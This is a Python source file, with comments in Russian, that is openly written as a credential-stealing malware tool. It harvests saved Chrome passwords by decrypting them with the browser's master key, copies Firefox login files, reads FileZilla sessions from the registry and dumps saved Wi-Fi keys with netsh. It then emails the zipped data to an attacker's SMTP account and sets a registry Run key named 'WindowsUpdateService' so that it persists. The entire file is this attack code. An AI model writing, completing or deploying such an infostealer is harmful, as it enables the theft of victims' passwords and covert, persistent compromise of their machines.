import os
import re
import sys
import json
import shutil
import sqlite3
import smtplib
import winreg
import zipfile
import base64
import requests
from Cryptodome.Cipher import AES
from datetime import datetime

# Конфигурация
EMAIL = "hacker@protonmail.com"
EMAIL_PASS = "your_password"
SMTP_SERVER = "smtp.protonmail.ch"
SMTP_PORT = 587

class PasswordStealer:
    def __init__(self):
        self.log_file = os.path.join(os.getenv('TEMP'), "system_log.txt")
        self.data = {
            "system": {}, 
            "browsers": {}, 
            "clients": {},
            "wifi": []
        }

    def collect_system_info(self):
        """Сбор системной информации"""
        self.data["system"] = {
            "user": os.getenv('USERNAME'),
            "hostname": os.getenv('COMPUTERNAME'),
            "os": sys.getwindowsversion(),
            "datetime": str(datetime.now()),
            "antivirus": self.get_antivirus()
        }

    def get_antivirus(self):
        """Обнаружение антивируса"""
        try:
            reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
            key = winreg.OpenKey(reg, r"SOFTWARE\Microsoft\Windows Defender")
            return "Windows Defender (Active)"
        except:
            return "Unknown"

    def decrypt_password(self, buff, master_key):
        """Расшифровка паролей Chrome"""
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode()
        except:
            return "Failed"

    def get_master_key(self, path):
        """Получение мастер-ключа из Local State"""
        try:
            with open(path, 'r') as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            return win32crypt.CryptUnprotectData(master_key[5:], None, None, None, 0)[1]
        except:
            return None

    def steal_chrome_passwords(self):
        """Кража паролей из Chrome"""
        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                                  'Google', 'Chrome', 'User Data')
        login_db = os.path.join(chrome_path, 'Default', 'Login Data')
        local_state = os.path.join(chrome_path, 'Local State')

        if not os.path.exists(login_db):
            return

        master_key = self.get_master_key(local_state)
        if not master_key:
            return

        # Копируем БД чтобы обойти блокировку
        temp_db = os.path.join(os.getenv('TEMP'), "chrome_temp.db")
        shutil.copy2(login_db, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for row in cursor.fetchall():
            url, user, encrypted_pass = row
            decrypted = self.decrypt_password(encrypted_pass, master_key)
            passwords.append(f"URL: {url}\nUser: {user}\nPassword: {decrypted}\n")
        
        self.data["browsers"]["Chrome"] = passwords
        os.remove(temp_db)

    def steal_firefox_passwords(self):
        """Кража паролей из Firefox"""
        firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        if not os.path.exists(firefox_path):
            return

        for profile in os.listdir(firefox_path):
            if '.default' in profile:
                db_path = os.path.join(firefox_path, profile, 'logins.json')
                if os.path.exists(db_path):
                    with open(db_path, 'r') as f:
                        data = json.load(f)
                    self.data["browsers"]["Firefox"] = data["logins"]

    def steal_filezilla(self):
        """Кража сохраненных сессий FileZilla"""
        filezilla_path = os.path.join(os.getenv('APPDATA'), 'FileZilla')
        if not os.path.exists(filezilla_path):
            return

        sessions = []
        # Чтение реестровых сессий
        try:
            reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
            key = winreg.OpenKey(reg, r"Software\FileZilla")
            for i in range(winreg.QueryInfoKey(key)[0]):
                subkey_name = winreg.EnumKey(key, i)
                if subkey_name.startswith('RecentServers'):
                    subkey = winreg.OpenKey(key, subkey_name)
                    host = winreg.QueryValueEx(subkey, "Host")[0]
                    user = winreg.QueryValueEx(subkey, "User")[0]
                    passwd = winreg.QueryValueEx(subkey, "Pass")[0]
                    sessions.append(f"Host: {host} | User: {user} | Pass: {passwd}")
        except:
            pass
        self.data["clients"]["FileZilla"] = sessions

    def steal_wifi_passwords(self):
        """Кража сохраненных WiFi паролей"""
        try:
            output = os.popen('netsh wlan show profiles').read()
            profiles = re.findall(r": (.*)", output)
            
            for profile in profiles:
                try:
                    results = os.popen(f'netsh wlan show profile name="{profile}" key=clear').read()
                    password = re.search(r"Key Content\s*: (.*)", results)
                    if password:
                        self.data["wifi"].append({
                            "ssid": profile.strip(),
                            "password": password.group(1).strip()
                        })
                except:
                    continue
        except:
            pass

    def send_email(self):
        """Отправка данных на почту"""
        try:
            # Сохраняем данные в файл
            with open(self.log_file, 'w') as f:
                json.dump(self.data, f, indent=4)
            
            # Архивируем
            zip_path = os.path.join(os.getenv('TEMP'), "logs.zip")
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                zipf.write(self.log_file, "system_data.txt")
            
            # Отправка
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(EMAIL, EMAIL_PASS)
                
                msg = f"Subject: Data from {os.getenv('COMPUTERNAME')}\n\n"
                server.sendmail(EMAIL, EMAIL, msg)
                
                with open(zip_path, 'rb') as f:
                    file_data = f.read()
                server.sendmail(EMAIL, EMAIL, file_data)
            
            os.remove(self.log_file)
            os.remove(zip_path)
            return True
        except:
            return False

    def persist(self):
        """Установка персистентности"""
        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
            key = winreg.OpenKey(reg, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            return True
        except:
            return False

    def run(self):
        """Основной метод выполнения"""
        self.collect_system_info()
        self.steal_chrome_passwords()
        self.steal_firefox_passwords()
        self.steal_filezilla()
        self.steal_wifi_passwords()
        self.persist()
        self.send_email()

if __name__ == "__main__":
    stealer = PasswordStealer()
    stealer.run()